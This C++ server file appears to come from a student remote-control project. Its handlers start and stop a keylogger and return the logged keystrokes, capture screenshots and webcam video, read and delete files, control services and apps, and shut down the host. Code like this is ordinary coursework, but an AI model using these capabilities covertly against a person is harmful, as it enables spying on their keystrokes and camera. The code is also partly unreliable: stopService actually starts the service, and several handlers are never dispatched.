#include "Server.h"
#include "App.h"
#include "KeyLogger.h"
#include "File.h"
#include "Service.h"
#include "Webcam.h"
#include "Screenshot.h"

bool Server::keylog(Request& request, Response &response) {
    static KeyLogger keylog;

    std::string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");
    
    if (subaction == "Start") {
        cout << "Started keylogger\n";
        keylog.startKeylogger(); 
    } else if (subaction == "Stop") {
        cout << "Stopped keylogger\n";
        keylog.stopKeylogger();

        std::ifstream fin = keylog.getLoggingStream();
        std::string content; 
        std::string buf;
        while (getline(fin, buf)) {
            content += buf + "\n"; 
        }
        fin.close();
    
        response.putParam(kBody, content);

        // Gui file TODO DELETE
        // fin = std::ifstream("tmt.txt", fstream::binary);
        response.putParam(kFilePrefix + "tmt.txt", "");
    }  

    return true;
}

bool Server::handleShutdownSystem(Request& request, Response &response){
    App app;
    app.shutdownSystem();
    response.putParam(kStatus, "Shutdown initiated");
    return true;
}
bool Server::handleRestartSystem(Request& request, Response &response){
    App app;
    app.restartSystem();
    response.putParam(kStatus, "Restart initiated");
    return true;
}

bool Server::listRunningApps(Request& request, Response &response){
    App app;
    std::vector<std::string> appList = app.getRunningTaskbarApps();
    std::string appList_str = "Running Application: \n";
    for (int i = 0; i < appList.size(); i++){
        appList_str += std::to_string(i + 1) + ". " + appList[i] + "\n";
    }
    response.putParam(kBody, appList_str);
    return true;
}

bool Server::closeApp(Request& request, Response& response){
    App app;
    std::vector<std::string> appList = app.getRunningTaskbarApps();

    int appIndex = std::stoi(request.getParam("AppIndex"));
    if (appIndex <= 0 || appIndex > appList.size()){
        response.putParam(kStatus, "Invalid index");
        return false;
    }
    std::string appName = appList[appIndex - 1];
    bool success = app.closeApplication(appName);
    response.putParam(kStatus, success ? "Closed" : "Failed to close");
    return true;
}

bool Server::listInstalledApps(Request& request, Response& response){
    App app;
    std::vector<AppInfo> appList = app.getInstalledApps();
    std::string appList_str = "Installed application: \n";
    for (int i = 0; i < appList.size(); i++){
        appList_str += std::to_string(i + 1) + ". " + appList[i].name + "\n";
    }
    response.putParam(kBody, appList_str);
    return true;
}

bool Server::runApp(Request& request, Response &response){
    App app;
    std::vector<AppInfo> appList = app.getInstalledApps();

    int appIndex = std::stoi(request.getParam("AppIndex"));
    if (appIndex <= 0 || appIndex > appList.size()){
        response.putParam(kStatus, "Invalid index");
        return false;
    }
    std::string appPath = appList[appIndex - 1].fullpath;
    bool success = app.runApplication(appPath);
    response.putParam(kBody, success ? "App is running" : "Failed to run");
    return true;
}

bool Server::handleApp(Request& request, Response& response){
    std::string subAction = request.getParam(kSubAction);
    if (subAction == "listrunningapps")
        return listRunningApps(request, response);
    else if (subAction == "closeapp")
        return closeApp(request, response);
    else if (subAction == "listinstalledapps")
        return listInstalledApps(request, response);
    else if (subAction == "runapp")
        return runApp(request, response);
    else{
        response.putParam(kStatus, "Invalid subaction");
        return false;
    }
}

bool Server::handleStatus(Request& request, Response& response){
    std::string subAction = request.getParam(kSubAction);
    if (subAction == "shutdown")
        return handleShutdownSystem(request, response);
    else if (subAction == "restart")
        return handleRestartSystem(request, response);
    else{
        response.putParam(kStatus, "Invalid subaction");
        return false;
    }
}

// Thang : File & Service
// ---Start---
bool Server::handleGetFile(Request& request, Response& response){
    File file;
    std::string file_name = request.getParam(kFilePrefix + "tmt.txt"); // Thêm dùm tui khúc này nha Thịnh
    std::string file_content = file.readFile(file_name);
    response.putParam(kBody, file_content);
    return true;
    
}

bool Server::handleDeleteFile(Request& request, Response& response){
    File file;
    std::string file_name = request.getParam(kFilePrefix + "tmt.txt"); // Thêm dùm tui khúc này nha Thịnh
    file.deleteFile(file_name);
    response.putParam(kBody, "Deleted File");
    return true;
}

bool Server::listRunningService(Request& request, Response& response){
    Service service;
    std::string list_service = service.listRunningServices();
    response.putParam(kBody, list_service);
    return true;
}

bool Server::startService(Request& request, Response& response){
    Service service;
    string name_service = request.getParam("Name");
    bool success = service.StartServiceByName(name_service);
    response.putParam(kBody, success ? "Service is running" : "Failed to run");
    return true;
}

bool Server::stopService(Request& request, Response& response){
    Service service;
    string name_service = request.getParam("Name");
    bool success = service.StartServiceByName(name_service);
    response.putParam(kBody, success ? "Stopped" : "Failed to stop");
    return true;
}

bool Server::handleService(Request& request, Response& response){
    string subAction = request.getParam(kSubAction);
    if (subAction == "listservice")
        return listRunningService(request, response);
    else if (subAction == "startservice")
        return startService(request, response);
    else if (subAction == "stopservice")
        return stopService(request, response);
    else{
        response.putParam(kStatus, "Invalid subaction");
        return false;
    }
    return true;
}

// ---End--- (File & Service)

bool Server::processRequest(Request& request, Response &response) {
    cout << "Processing Request\n" << request << "\n";
    response.setAction(request.getAction());
    response.setParams(request.getParams());

    // TODO param order
    
    switch (request.getAction()) {
        case ACTION_KEYLOG:
            return keylog(request, response);
        case ACTION_SHUTDOWN:
            return handleStatus(request, response);
        case ACTION_APP:
            return handleApp(request, response);
        default:
            return false;
    }
}

//Duc
bool Server::screenshot(Request& request, Response &response){
    std::string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");
    Screenshot screenshot;

    if (subaction == "Screenshot") {
        std::cout << "Started screenshot!\n";
        screenshot.screenshot();
    }
    response.putParam(kFilePrefix + "screencapture.bmp", "");
    return true;
}

bool Server::getVideoByWebcam(Request& request, Response &response) {
    Webcam webcam;
    std::string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");

    if (subaction == "Start") {
        const string filename = "../build/files/videowebcam.mp4";
        bool result = webcam.StartWebcamRecording(filename);
        if (!result) {
            response.putParam(kStatus, "Error: Failed to start recording.");
        }
    }
    else if (subaction == "Stop") {
        bool result = webcam.StopWebcamRecording();  // Dừng quay
        if (!result) {
            response.putParam(kStatus, "Error: Failed to stop recording.");
        }
    }
    response.putParam(kFilePrefix + "videowebcam.mp4", "");
    return true;
}